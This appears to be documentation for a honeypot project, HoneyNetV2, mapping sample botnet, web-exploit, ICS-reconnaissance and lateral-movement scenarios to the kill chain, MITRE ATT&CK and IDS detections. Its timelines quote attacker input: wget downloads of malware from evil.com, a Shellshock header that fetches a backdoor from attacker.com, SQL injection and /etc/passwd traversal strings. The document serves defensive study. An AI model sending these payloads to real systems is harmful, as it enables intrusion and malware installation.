# HoneyNetV2 Attack Scenarios and Kill Chain

## Overview

This document illustrates typical attack scenarios captured by HoneyNetV2, mapped to the Cyber Kill Chain and MITRE ATT&CK framework.

**Last Updated**: 2025-10-24

---

## Table of Contents

1. [Attack Kill Chain](#attack-kill-chain)
2. [Scenario 1: IoT Botnet Infection](#scenario-1-iot-botnet-infection)
3. [Scenario 2: Web Application Exploitation](#scenario-2-web-application-exploitation)
4. [Scenario 3: ICS/SCADA Reconnaissance](#scenario-3-icsscada-reconnaissance)
5. [Scenario 4: Lateral Movement](#scenario-4-lateral-movement)
6. [Detection Coverage Matrix](#detection-coverage-matrix)

---

## Attack Kill Chain

### Generic Attack Flow in HoneyNetV2

```
┌────────────────────────────────────────────────────────────────────────┐
│                        CYBER KILL CHAIN                                │
│                     (Lockheed Martin Model)                            │
└────────────────────────────────────────────────────────────────────────┘

Phase 1: Reconnaissance
───────────────────────
   Attacker                       HoneyNet
      │                              │
      │  1. Port Scan (nmap)         │
      ├─────────────────────────────►│ Suricata: SID 1000025 (SYN Scan)
      │                              │ Zeek: conn.log (multiple SYN)
      │                              │ ClickHouse: network_connections
      │                              │ MITRE: T1046 (Network Service Scanning)
      │                              │
      │  2. Service Banner Grab      │
      ├─────────────────────────────►│ Honeypot responds with fake banner
      │     ← "SSH-2.0-OpenSSH_7.4"  │ Logged in honeypot_events
      │                              │

Phase 2: Weaponization (External)
──────────────────────────────────
   [Attacker prepares exploit/payload]
   [Not directly observable in honeypot]

Phase 3: Delivery
──────────────────
      │                              │
      │  3. SSH Brute Force          │
      │     (username/password)      │
      ├─────────────────────────────►│ Cowrie: Logs each attempt
      ├─────────────────────────────►│ credentials table: root/admin
      ├─────────────────────────────►│ Suricata: SID 2000005 (Brute Force)
      │                              │ MITRE: T1110.001 (Password Guessing)
      │                              │
      │  4. Successful Login         │
      │     "root:password"          │
      ├─────────────────────────────►│ Cowrie: success=1, session starts
      │                              │ Attacker now in emulated shell
      │                              │

Phase 4: Exploitation
──────────────────────
      │                              │
      │  5. Command Execution        │
      │     "uname -a"               │
      ├─────────────────────────────►│ Cowrie: command logged
      │     ← "Linux server01 ..."   │ Fake system info returned
      │                              │
      │  6. Malware Download         │
      │     "wget http://evil.com/   │
      │      malware.bin"            │
      ├─────────────────────────────►│ Cowrie: command logged
      │                              │ downloaded_files: malware.bin
      │                              │ File hash: SHA256(...)
      │                              │ Suricata: SID 2000027 (Suspicious Download)
      │                              │ MITRE: T1105 (Ingress Tool Transfer)
      │                              │

Phase 5: Installation
──────────────────────
      │                              │
      │  7. Malware Execution        │
      │     "chmod +x malware.bin"   │
      │     "./malware.bin &"        │
      ├─────────────────────────────►│ Cowrie: commands logged
      │                              │ [Honeypot doesn't actually execute]
      │                              │ [Attacker thinks it's running]
      │                              │

Phase 6: Command & Control (C2)
────────────────────────────────
      │                              │
      │  8. C2 Beacon Attempt        │
      │     [Malware tries to        │
      │      contact C2 server]      │
      ├─────────────────────────────►│ Blocked by firewall (no egress)
      │         ✗ CONNECTION FAILED  │ Suricata: Detects beacon pattern
      │                              │ MITRE: T1071 (Application Layer Protocol)
      │                              │

Phase 7: Actions on Objectives
───────────────────────────────
      │                              │
      │  9. Lateral Movement Attempt │
      │     "ssh root@172.20.0.11"   │
      ├─────────────────────────────►│ Cowrie: Internal SSH attempt
      │                              │ Suricata: SID 2000035 (Lateral Movement)
      │                              │ honeypot_events: dest_ip=172.20.0.11
      │                              │ MITRE: T1570 (Lateral Tool Transfer)
      │                              │
      │  10. Data Exfiltration       │
      │      [Attacker tries to      │
      │       send data out]         │
      ├─────────────────────────────►│ Blocked by firewall
      │         ✗ CONNECTION FAILED  │ MITRE: T1041 (Exfiltration Over C2)
      │                              │
      └──────────────────────────────┘

RESULT: Full attack chain captured and neutralized
        All stages logged to ClickHouse
        No actual compromise occurred
```

---

## Scenario 1: IoT Botnet Infection

### Mirai Botnet Attack Pattern

**Attacker Profile**:
- **Origin**: China (CN)
- **Target**: Telnet (port 23)
- **Goal**: Recruit device into botnet for DDoS attacks

### Attack Timeline

```
T+0s: Initial Scan
──────────────────
  Attacker scans entire subnet for port 23
  → Detection: Suricata SID 1000025 (Port Scan)
  → Logged: network_connections (multiple SYN to port 23)

T+5s: Connection Established
────────────────────────────
  Attacker connects to Cowrie Telnet honeypot
  → Detection: Cowrie logs connection
  → honeypot_events: protocol='telnet', event_type='cowrie_connection'

T+10s: Brute Force Attack
─────────────────────────
  Attacker tries default credentials:
    - admin:admin
    - root:root
    - admin:1234
    - user:user
  → Detection: Suricata SID 2000002 (Telnet Brute Force)
  → Logged: credentials table (4 attempts)
  → MITRE: T1110.001 (Brute Force: Password Guessing)

T+15s: Successful Login
───────────────────────
  Credential "admin:admin" succeeds (intentionally allowed)
  → credentials.success = 1
  → Cowrie: Session established, assigns session_id

T+20s: Malicious Commands
─────────────────────────
  Attacker executes reconnaissance:
    "/bin/busybox MIRAI"  ← Botnet identifier
  → Detection: Suricata SID 1000004 (Mirai Scanner Activity)
  → honeypot_events: command='/bin/busybox MIRAI'
  → MITRE: T1059 (Command and Scripting Interpreter)

T+25s: Malware Download
───────────────────────
  "cd /tmp && wget http://evil.com/mirai.mips && chmod +x mirai.mips"
  → Detection: Suricata SID 2000027 (Suspicious Binary Download)
  → downloaded_files: file_hash=a3f8b9c2..., filename='mirai.mips'
  → MITRE: T1105 (Ingress Tool Transfer)

T+30s: Execution Attempt
────────────────────────
  "./mirai.mips"
  → Logged but not executed (honeypot limitation)
  → Attacker believes successful

T+35s: C2 Communication Attempt
───────────────────────────────
  Malware tries to connect to C2 server 123.45.67.89:48101
  → Blocked by firewall (no egress from DMZ)
  → Suricata: Alert on C2 beacon pattern
  → MITRE: T1071.001 (Application Layer Protocol: Web Protocols)

T+40s: Connection Timeout
─────────────────────────
  Attacker loses connection (idle timeout)
  → Cowrie: Session closed
  → Total duration: 40 seconds
  → Total commands: 5
```

### Data Generated

**ClickHouse Tables**:
- `honeypot_events`: 1 connection, 5 commands
- `credentials`: 4 failed attempts, 1 success
- `downloaded_files`: 1 file (mirai.mips)
- `ids_alerts`: 3 alerts (port scan, brute force, download)
- `attacker_profiles`: Profile created/updated

**MITRE ATT&CK Techniques**:
- T1046 - Network Service Scanning
- T1110.001 - Brute Force: Password Guessing
- T1059 - Command and Scripting Interpreter
- T1105 - Ingress Tool Transfer
- T1071.001 - Application Layer Protocol

---

## Scenario 2: Web Application Exploitation

### Shellshock (CVE-2014-6271) Exploit

**Attacker Profile**:
- **Origin**: Russia (RU)
- **Target**: HTTP (port 80)
- **Goal**: Remote code execution

### Attack Timeline

```
T+0s: Exploit Delivery
──────────────────────
  POST /cgi-bin/test.sh HTTP/1.1
  User-Agent: () { :; }; /bin/bash -c 'wget http://attacker.com/backdoor.sh'
  Referer: () { :; }; echo vulnerable

  → Detection: Dionaea HTTP honeypot receives request
  → Suricata: SID 2000008 (Shellshock Exploit)
  → Logstash: Detects Shellshock pattern in User-Agent
  → honeypot_events: is_exploit='1', exploit_type='shellshock'
  → MITRE: T1190 (Exploit Public-Facing Application)

T+1s: Additional Probes
───────────────────────
  Attacker tries multiple vectors:
    - Cookie header with payload
    - X-Forwarded-For with payload
    - Custom header injection

  → All logged to honeypot_events
  → Suricata generates 3 additional alerts
  → http_requests table: 4 entries with malicious User-Agent

T+5s: SQL Injection Attempt
───────────────────────────
  GET /login?user=admin'+OR+'1'='1 HTTP/1.1

  → Detection: Suricata SID 1000029 (SQL Injection)
  → Logstash: Detects SQL pattern in URL
  → honeypot_events: is_exploit='1', exploit_type='sqli'
  → MITRE: T1190 (Exploit Public-Facing Application)

T+10s: Directory Traversal
──────────────────────────
  GET /../../../etc/passwd HTTP/1.1

  → Detection: Suricata SID 1000028 (Directory Traversal)
  → Dionaea logs attempt
  → honeypot_events: is_exploit='1', exploit_type='traversal'

T+15s: Attacker Disconnects
───────────────────────────
  No further activity (exploit didn't work in honeypot)
  → Session ends
```

### Data Generated

**ClickHouse Tables**:
- `honeypot_events`: 6 HTTP requests, 4 marked as exploits
- `http_requests`: 6 entries with suspicious patterns
- `ids_alerts`: 5 alerts (Shellshock, SQLi, Traversal)

**MITRE ATT&CK Techniques**:
- T1190 - Exploit Public-Facing Application
- T1059 - Command and Scripting Interpreter
- T1071.001 - Application Layer Protocol: Web Protocols

---

## Scenario 3: ICS/SCADA Reconnaissance

### Modbus Protocol Attack

**Attacker Profile**:
- **Origin**: United States (US) - Likely security researcher
- **Target**: Modbus (port 502)
- **Goal**: Identify ICS devices and read registers

### Attack Timeline

```
T+0s: Service Discovery
───────────────────────
  TCP SYN to port 502 (Modbus)
  → Conpot accepts connection (emulating Siemens S7-300 PLC)
  → network_connections: service='modbus', conn_state='SF'

T+5s: Modbus Read Registers
───────────────────────────
  Modbus Function Code 03 (Read Holding Registers)
  Address: 0, Quantity: 10

  → Conpot responds with fake register values
  → Detection: Suricata SID 2000019 (Modbus Unauthorized Read)
  → honeypot_events: protocol='modbus', event_type='conpot_modbus_read'
  → MITRE: T0840 (Network Connection Enumeration - ICS)

T+10s: SNMP Enumeration
───────────────────────
  SNMP GET request (community: 'public')
  OID: 1.3.6.1.2.1.1.1.0 (sysDescr)

  → Conpot responds: "Siemens SIMATIC S7-300"
  → Detection: Suricata SID 1000013 (SNMP Brute Force)
  → honeypot_events: protocol='snmp', event_type='conpot_snmp_request'

T+15s: Modbus Write Attempt
───────────────────────────
  Modbus Function Code 06 (Write Single Register)
  Address: 100, Value: 42

  → Conpot logs write attempt (doesn't actually change anything)
  → Detection: Suricata SID 2000020 (Modbus Write Command)
  → honeypot_events: event_type='conpot_modbus_write'
  → MITRE: T0836 (Modify Parameter - ICS)

T+20s: S7comm Protocol Scan
───────────────────────────
  S7comm CONNECT request (Siemens-specific)

  → Conpot responds with S7 handshake
  → honeypot_events: protocol='s7comm'
  → MITRE: T0846 (Remote System Discovery - ICS)

T+25s: Attacker Disconnects
───────────────────────────
  Reconnaissance complete, attacker disconnects
  → Total duration: 25 seconds
  → 4 protocols tested (Modbus, SNMP, S7, Ethernet/IP)
```

### Data Generated

**ClickHouse Tables**:
- `honeypot_events`: 8 ICS protocol interactions
- `ids_alerts`: 3 alerts (Modbus read, SNMP, Modbus write)
- `network_connections`: 4 connections to ICS ports

**MITRE ATT&CK Techniques** (ICS-specific):
- T0840 - Network Connection Enumeration
- T0836 - Modify Parameter
- T0846 - Remote System Discovery

---

## Scenario 4: Lateral Movement

### Post-Exploitation Internal Pivoting

**Context**: Attacker has compromised Cowrie honeypot and attempts to move laterally within the DMZ.

### Attack Timeline

```
T+0s: Attacker Compromised Cowrie
──────────────────────────────────
  [Previous: Successful SSH brute-force into Cowrie]
  Attacker now has shell access (emulated)

T+10s: Internal Network Discovery
──────────────────────────────────
  Command: "ip addr show"
  Output: "172.20.0.10/24"  (Cowrie's IP)

  Command: "ping 172.20.0.11"
  → Cowrie logs command
  → honeypot_events: command='ping 172.20.0.11'

T+20s: Internal Port Scan
─────────────────────────
  Command: "for p in 22 80 445 502; do nc -zv 172.20.0.11 $p; done"

  → Cowrie logs commands
  → Suricata: Detects internal scanning
  → ids_alerts: Multiple connection attempts to internal IPs
  → MITRE: T1046 (Network Service Scanning)

T+30s: SSH to Another Honeypot
──────────────────────────────
  Command: "ssh root@172.20.0.11"  (Dionaea IP)

  → Detection: Suricata SID 2000035 (LATERAL_MOVEMENT SSH Tunneling)
  → honeypot_events: dest_ip='172.20.0.11', protocol='ssh'
  → network_connections: Internal DMZ traffic logged
  → Zeek: conn.log shows 172.20.0.10 → 172.20.0.11:22
  → MITRE: T1570 (Lateral Tool Transfer)

T+35s: HTTP Request to Internal Service
───────────────────────────────────────
  Command: "curl http://172.20.0.11/"

  → Dionaea receives HTTP request from internal IP
  → honeypot_events: Two entries (Cowrie command + Dionaea connection)
  → Zeek: http.log shows internal HTTP request
  → Suricata: Internal HTTP traffic alert

T+40s: Attacker Realizes Honeypot
──────────────────────────────────
  [No malware successfully executes]
  [C2 connections fail]
  [Likely suspects honeypot environment]
  → Connection terminates
```

### Data Generated

**ClickHouse Tables**:
- `honeypot_events`: 5 commands (Cowrie) + 2 connections (Dionaea)
- `ids_alerts`: 1 lateral movement alert (SID 2000035)
- `network_connections`: 3 internal DMZ connections
- `http_requests`: 1 internal HTTP request

**MITRE ATT&CK Techniques**:
- T1046 - Network Service Scanning
- T1570 - Lateral Tool Transfer
- T1572 - Protocol Tunneling (SSH)

---

## Detection Coverage Matrix

### Coverage by Attack Phase

| Kill Chain Phase | Honeypot Detection | IDS Detection | MITRE Techniques |
|------------------|-------------------|---------------|------------------|
| **Reconnaissance** | Connection logs | Port scan alerts (SID 1000025) | T1046 |
| **Delivery** | Brute-force logs | Brute-force alerts (SID 2000005, 2000002) | T1110.001 |
| **Exploitation** | Command logs, exploit patterns | Exploit alerts (Shellshock, SQLi) | T1190, T1059 |
| **Installation** | File downloads, execution attempts | Malware download alerts (SID 2000027) | T1105 |
| **C2** | Blocked by firewall | C2 beacon detection | T1071 |
| **Actions on Objectives** | Lateral movement logs | Lateral movement alerts (SID 2000035) | T1570 |

### Detection Rate by Protocol

| Protocol | Honeypot | IDS | Expected TPR |
|----------|----------|-----|--------------|
| SSH | Cowrie | Suricata (2000005) | >95% |
| Telnet | Cowrie | Suricata (2000002) | >95% |
| HTTP | Dionaea | Suricata (2000008, 2000009) | >90% |
| SMB | Dionaea | Suricata (1000009, 1000010) | >85% |
| Modbus | Conpot | Suricata (2000019, 2000020) | >80% |
| SNMP | Conpot | Suricata (1000013) | >80% |

### MITRE ATT&CK Coverage

**Total Techniques Covered**: 15+

**By Tactic**:
- **Initial Access**: T1190 (Exploit Public-Facing Application)
- **Execution**: T1059 (Command and Scripting Interpreter)
- **Persistence**: T1098 (Account Manipulation)
- **Credential Access**: T1110.001 (Brute Force: Password Guessing)
- **Discovery**: T1046 (Network Service Scanning), T1018 (Remote System Discovery)
- **Lateral Movement**: T1570 (Lateral Tool Transfer), T1572 (Protocol Tunneling)
- **Command & Control**: T1071 (Application Layer Protocol)
- **Exfiltration**: T1041 (Exfiltration Over C2 Channel)

**ICS-Specific** (ATT&CK for ICS):
- T0840 - Network Connection Enumeration
- T0836 - Modify Parameter
- T0846 - Remote System Discovery

---

## Visualization in Grafana

### Recommended Dashboards

1. **Attack Kill Chain Timeline**:
   - Show attack progression from recon to actions
   - Time-series of events by kill chain stage

2. **MITRE ATT&CK Heatmap**:
   - Visualize technique frequency
   - Highlight most common TTPs

3. **Geographic Attack Flow**:
   - Source countries
   - Targeted services
   - Attack patterns by region

---

## References

- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [MITRE ATT&CK for ICS](https://attack.mitre.org/matrices/ics/)

---

**Document Version**: 1.0
**Author**: Agent #6b - Testing & Documentation
